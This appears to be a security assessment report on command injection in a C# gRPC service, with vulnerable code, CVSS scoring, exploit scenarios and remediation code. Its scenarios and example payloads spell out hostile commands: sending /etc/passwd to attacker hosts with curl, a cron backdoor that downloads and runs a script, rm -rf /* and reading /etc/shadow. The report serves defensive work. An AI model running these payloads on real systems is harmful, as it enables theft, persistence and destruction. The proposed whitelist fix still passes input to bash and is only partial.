# Command Injection in gRPC Service Requiring VPN Access

# Vulnerability Case
During our assessment of Acme Corp’s microservices architecture, we discovered that a .NET Core-based gRPC service responsible for executing OS commands was vulnerable to command injection. Analysis of the service's source code revealed that user-supplied input from gRPC requests was directly concatenated into a shell command without proper validation or sanitization. This issue was uncovered during routine source code reviews and dynamic testing of the service endpoints. The vulnerable component is built with C# on the .NET Core framework and deployed on Linux-based servers in a containerized environment. An attacker inside internal network (requires vpn access) could exploit this flaw to execute arbitrary commands, potentially leading to total system compromise.

```csharp
using System;
using System.Diagnostics;
using System.Threading.Tasks;
using Grpc.Core;

public class CommandService : CommandService.CommandServiceBase
{
    public override Task<CommandResponse> ExecuteCommand(
        CommandRequest request, ServerCallContext context)
    {
        // Vulnerable: Directly using unvalidated input in OS command execution
        string userCommand = request.InputCommand;
        
        var startInfo = new ProcessStartInfo
        {
            FileName = "/bin/bash",
            Arguments = $"-c \"{userCommand}\"",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };
        
        Process process = Process.Start(startInfo);
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        
        return Task.FromResult(new CommandResponse { Output = output });
    }
}
```

The vulnerability arises because the gRPC service indiscriminately passes the contents of the `InputCommand` field to the system shell, making it trivial for an attacker to inject malicious commands. Exploitation typically involves crafting a gRPC request with shell metacharacters or chaining commands that get executed in the host environment. Given the use of a widely adopted C#/.NET Core stack in production, any successful attack could lead to full system compromise, data exfiltration, or lateral escalation within the network. This poses a severe business risk, including potential service outages, regulatory non-compliance, and reputational damage.

context: csharp.dotnet-core.command-injection.process-taint-grpc.process-taint-grpc Untrusted input might be injected into a command executed by the application, which can lead to a command injection vulnerability. An attacker can execute arbitrary commands, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing OS commands with user input. If this is unavoidable, validate and sanitize the input, and use safe methods for executing the commands.

# Vulnerability Breakdown
This vulnerability involves a command injection flaw in a .NET Core gRPC service that directly executes OS commands based on untrusted user input, but requires both VPN access and basic privileges to exploit.

1. **Key vulnerability elements**:
   - Direct passing of user-supplied input from gRPC requests to shell commands
   - No input validation or sanitization before command execution
   - Use of `/bin/bash -c` which interprets shell metacharacters
   - Deployment in containerized Linux environment exposing critical infrastructure
   - Implementation in C# using .NET Core's Process.Start() method
   - Access restricted to users with VPN connectivity and basic authentication

2. **Potential attack vectors**:
   - Authenticated users with VPN access injecting shell metacharacters to execute arbitrary commands
   - Internal users or attackers who have compromised VPN credentials chaining commands
   - Lateral movement limited to resources accessible from the containerized environment
   - Exploitation through specially crafted gRPC requests containing malicious command payloads

3. **Severity assessment**:
   - Adjacent network exploitation requiring VPN connectivity
   - Complete system compromise potential (arbitrary command execution)
   - High impact across confidentiality, integrity, and availability
   - Low complexity to exploit with standard command injection techniques
   - Basic privileges required for exploitation

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Adjacent (A) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): Low (L) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A high-severity command injection vulnerability has been identified in Acme Corp's microservices architecture, specifically in a .NET Core-based gRPC service responsible for executing OS commands. The vulnerable service directly incorporates user-supplied input from gRPC requests into shell commands without performing any validation or sanitization. Exploitation requires both VPN access to the internal network and basic authenticated access to the service.

```csharp
public override Task<CommandResponse> ExecuteCommand(
    CommandRequest request, ServerCallContext context)
{
    // Vulnerable: Directly using unvalidated input in OS command execution
    string userCommand = request.InputCommand;
    
    var startInfo = new ProcessStartInfo
    {
        FileName = "/bin/bash",
        Arguments = $"-c \"{userCommand}\"",
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true,
    };
    
    Process process = Process.Start(startInfo);
    string output = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
    
    return Task.FromResult(new CommandResponse { Output = output });
}

```

This vulnerability allows authenticated users with VPN access to inject arbitrary system commands by including shell metacharacters (such as `;`, `|`, `&&`, `||`) in their gRPC requests. Because the service executes these commands using `/bin/bash -c`, any injected commands will run with the privileges of the service's container, potentially leading to data theft, system compromise, lateral movement, or service disruption within the containerized environment.

# CVSS
**Score**: 7.9 \
**Vector**: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H \
**Severity**: High

The High severity rating (7.9) is justified by the following factors:

- **Adjacent Attack Vector (AV:A)**: The vulnerability can only be exploited by attackers with VPN access to the internal network, which significantly restricts the attack surface compared to internet-exposed services.

- **Low Attack Complexity (AC:L)**: Once an attacker has VPN access, exploitation is straightforward and doesn't require special conditions or preparation. An attacker simply needs to include shell metacharacters in the gRPC request payload.

- **Low Privileges Required (PR:L)**: The attacker needs basic authenticated access to the gRPC service to exploit the vulnerability.

- **No User Interaction (UI:N)**: The vulnerability can be exploited without requiring any actions from users or administrators.

- **Unchanged Scope (S:U)**: While the impact is severe, the vulnerability only affects resources managed by the same security authority (the containerized service).

- **High Confidentiality Impact (C:H)**: An attacker can gain access to all data accessible to the service, potentially including sensitive configuration files, environment variables, and application data.

- **High Integrity Impact (I:H)**: An attacker can modify any data accessible to the service, potentially including application files and configurations.

- **High Availability Impact (A:H)**: An attacker can render the service completely unavailable, for example by killing processes or consuming system resources.

The requirements for both VPN access and basic privileges reduce the score from Critical to High, but the potential for complete service compromise still warrants a substantial severity rating.

# Exploitation Scenarios
**Scenario 1: Insider Threat Data Exfiltration**
A disgruntled employee with valid VPN access and service credentials crafts a gRPC request with the payload: `ls -la /etc && cat /etc/passwd | curl -X POST -d @- https://attacker-controlled-server.com/collect`. When processed by the vulnerable service, this command first lists directory contents to identify interesting files, then sends the system's user information to an external server. The employee could similarly extract environment variables, configuration files, or application data while hiding their actions within legitimate service usage.

**Scenario 2: Compromised VPN Credentials**
An external attacker who has obtained valid VPN credentials and service authentication through phishing or credential stuffing sends a payload like: `echo "*/5 * * * * curl -s https://attacker.com/backdoor.sh | bash" > /tmp/cron_job && crontab /tmp/cron_job`. This creates a cron job that connects to the attacker's server every 5 minutes to download and execute commands, establishing persistence even if the original vulnerability is patched.

**Scenario 3: Internal Reconnaissance and Lateral Movement**
A contractor with temporary VPN access exploits the vulnerability to perform network reconnaissance with a payload such as: `ip addr && netstat -tuln && nmap -sT -p 1-1000 10.0.0.0/24`. This reveals network interfaces, listening ports, and other services in the internal network. The contractor can then use the compromised container as a pivot point to attack other services in the infrastructure that wouldn't normally be accessible from outside.

**Scenario 4: Service Sabotage**
A competing business partner with legitimate VPN access performs a targeted denial of service attack with the payload: `rm -rf /* 2>/dev/null || (for i in $(seq 1 10); do yes > /tmp/file$i & done)`. This either attempts to delete critical files or, if that fails due to permissions, spawns resource-intensive processes that consume CPU and storage until the container crashes or becomes unresponsive, potentially during a critical business operation.

# Impact Analysis
**Business Impact:**
- Internal data breaches exposing sensitive corporate or customer information, potentially triggering regulatory penalties (GDPR, CCPA, etc.)
- Service outages affecting business operations and customer experience
- Limited reputational damage as exploitation requires VPN access, suggesting an insider threat component
- Financial losses from incident response, forensic investigation, and remediation efforts
- Potential legal liability if customer data is compromised through internal access
- Increased security costs for improving VPN monitoring and access controls

**Technical Impact:**
- Complete compromise of the containerized environment where the vulnerable service runs
- Unauthorized access to sensitive configuration files, environment variables, and credentials by internal users
- Potential for lateral movement to other services and infrastructure components within the VPN network
- Data theft, modification, or destruction affecting service integrity
- Creation of backdoors or persistent access mechanisms within the internal network
- Potential for container escape attacks compromising the host system
- Service disruption affecting availability and reliability metrics
- Unauthorized monitoring of service operations and data processing
- Modification of application behavior through tampering with configuration files

# Technical Details
The vulnerability exists in a .NET Core-based gRPC service that implements a command execution feature. The core issue is in the `ExecuteCommand` method, which takes user input directly from a gRPC request and passes it to the system shell without validation.

```csharp
public override Task<CommandResponse> ExecuteCommand(
    CommandRequest request, ServerCallContext context)
{
    // The vulnerability starts here - taking user input directly
    string userCommand = request.InputCommand;
    
    // Creating a process that will execute the command through bash
    var startInfo = new ProcessStartInfo
    {
        FileName = "/bin/bash",
        Arguments = $"-c \"{userCommand}\"",
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true,
    };
    
    // Executing the potentially malicious command
    Process process = Process.Start(startInfo);
    string output = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
    
    return Task.FromResult(new CommandResponse { Output = output });
}

```

This vulnerability is particularly severe for several reasons despite the VPN access requirement:

1. **Shell Execution Context**: Using `/bin/bash -c` means the input is interpreted by a shell that processes special characters like `;`, `|`, `&&`, `>`, `<`, which can be used to chain commands or redirect output.

2. **No Input Validation**: There is no attempt to validate or sanitize the user input before executing it as a command.

3. **Full Command Output Return**: The service returns the complete output of the command execution to the client, which aids attackers in information gathering.

4. **Containerized Environment**: While containerization provides some isolation, compromised containers can still access sensitive data or be used as a starting point for lateral movement.

**Exploitation Requirements:**

1. The attacker must have VPN access to the internal network where the service is deployed.
2. The attacker must possess valid credentials with at least basic privileges to authenticate to the gRPC service.
3. The attacker needs to craft a malicious gRPC request containing command injection payloads.

**Example Payloads:**

- Basic command chaining: `echo hello; id; pwd`
- Command substitution: `$(cat /etc/shadow)`
- Redirection to write files: `echo "malicious content" > /tmp/backdoor`
- Piping output to network tools: `cat /etc/passwd | curl -X POST -d @- http://attacker.com`

The containerized Linux environment adds complexity to both the potential impact and remediation. While container boundaries may limit some attacks, they don't eliminate the risk, especially if the container has been granted elevated privileges or access to sensitive resources within the internal network.

# Remediation Steps
## Implement Command Whitelisting and Parameter Sanitization

**Priority**: P0

Replace the direct command execution with a whitelist-based approach that only allows specific approved commands:

```csharp
public override Task<CommandResponse> ExecuteCommand(
    CommandRequest request, ServerCallContext context)
{
    string userCommand = request.InputCommand;
    
    // Validate command against whitelist
    if (!IsAllowedCommand(userCommand, out string sanitizedCommand, out string errorMessage))
    {
        return Task.FromResult(new CommandResponse { 
            Output = $"Error: {errorMessage}",
            Status = CommandStatus.Rejected
        });
    }
    
    // Now execute only the validated and sanitized command
    var startInfo = new ProcessStartInfo
    {
        FileName = "/bin/bash",
        Arguments = $"-c \"{sanitizedCommand}\"",
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true,
    };
    
    Process process = Process.Start(startInfo);
    string output = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
    
    return Task.FromResult(new CommandResponse { 
        Output = output,
        Status = CommandStatus.Executed
    });
}

private bool IsAllowedCommand(string input, out string sanitizedCommand, out string errorMessage)
{
    sanitizedCommand = string.Empty;
    errorMessage = string.Empty;
    
    // Define whitelist of allowed commands with parameter patterns
    var allowedCommands = new Dictionary<string, Regex>()
    {
        { "ls", new Regex(@"^ls\s+(-[la]+\s+)?(/[a-zA-Z0-9_\-./]+)$") },
        { "cat", new Regex(@"^cat\s+(/[a-zA-Z0-9_\-./]+)$") },
        { "echo", new Regex(@"^echo\s+([a-zA-Z0-9_\-. ]+)$") }
    };
    
    // Extract the command name (first word)
    string commandName = input.Split(' ')[0].Trim();
    
    // Check if the command is in our whitelist
    if (!allowedCommands.TryGetValue(commandName, out Regex parameterPattern))
    {
        errorMessage = $"Command '{commandName}' is not allowed";
        return false;
    }
    
    // Validate the entire command against the allowed pattern
    if (!parameterPattern.IsMatch(input))
    {
        errorMessage = $"Invalid parameters for command '{commandName}'";
        return false;
    }
    
    // At this point the command has passed our validation
    sanitizedCommand = input;
    return true;
}

```

This implementation:
1. Defines a strict whitelist of allowed commands and valid parameter patterns
2. Rejects any command not on the whitelist or with invalid parameters
3. Prevents command chaining and injection of shell metacharacters
4. Provides clear error messages when commands are rejected
5. Returns a status code alongside the output for better error handling
## Enhance VPN Security and Implement Enhanced Access Controls

**Priority**: P1

Strengthen security around VPN access and add additional authorization checks to the gRPC service:

```csharp
// Add these using statements
using Grpc.Core.Interceptors;
using Microsoft.AspNetCore.Authorization;
using System.Security.Claims;

// In Startup.cs, register the interceptor
public void ConfigureServices(IServiceCollection services)
{
    // Existing service configuration
    services.AddGrpc(options =>
    {
        options.Interceptors.Add<AuthorizationInterceptor>();
    });
    
    // Add strong authentication and role-based authorization
    services.AddAuthentication(...);
    services.AddAuthorization(options =>
    {
        options.AddPolicy("CommandExecutionPolicy", policy =>
            policy.RequireRole("CommandOperator")
                  .RequireClaim("CommandPermission", "Execute")
                  .RequireAuthenticatedUser());
    });
}

// Create an interceptor to enforce authorization
public class AuthorizationInterceptor : Interceptor
{
    private readonly IAuthorizationService _authorizationService;
    private readonly ILogger<AuthorizationInterceptor> _logger;

    public AuthorizationInterceptor(IAuthorizationService authorizationService, ILogger<AuthorizationInterceptor> logger)
    {
        _authorizationService = authorizationService;
        _logger = logger;
    }

    public override async Task<TResponse> UnaryServerHandler<TRequest, TResponse>(
        TRequest request,
        ServerCallContext context,
        UnaryServerMethod<TRequest, TResponse> continuation)
    {
        // Extract user from context
        var user = context.GetHttpContext().User;

        // Log all command execution attempts for audit
        if (typeof(TRequest).Name == "CommandRequest")
        {
            var commandRequest = request as dynamic;
            _logger.LogInformation(
                "Command execution attempt by {User}: {Command}",
                user.Identity.Name,
                commandRequest.InputCommand);
            
            // Perform additional command-specific authorization
            var authResult = await _authorizationService.AuthorizeAsync(
                user, commandRequest, "CommandExecutionPolicy");
                
            if (!authResult.Succeeded)
            {
                _logger.LogWarning(
                    "Unauthorized command execution attempt by {User}: {Command}",
                    user.Identity.Name,
                    commandRequest.InputCommand);
                    
                throw new RpcException(new Status(StatusCode.PermissionDenied, 
                    "You don't have permission to execute this command"));
            }
        }

        return await continuation(request, context);
    }
}

// Update the CommandService to enforce specific authorization
[Authorize(Policy = "CommandExecutionPolicy")]
public class CommandService : CommandService.CommandServiceBase
{
    // Existing service code with the fixed command execution logic
}

```

This implementation:
1. Adds role-based access control to the gRPC service
2. Creates a specific policy for command execution permission
3. Implements a gRPC interceptor to enforce authorization on every request
4. Adds comprehensive logging for all command execution attempts
5. Provides detailed audit trails for security monitoring
6. Enforces the principle of least privilege for command execution

Additionally, implement stricter VPN security measures:
1. Require multi-factor authentication for VPN access
2. Implement just-in-time VPN access for sensitive operations
3. Monitor and alert on unusual VPN connection patterns
4. Regularly rotate VPN credentials
5. Segment the internal network to limit lateral movement possibilities


# References
* CWE-78 | [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
* CWE-77 | [Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* CWE-284 | [Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
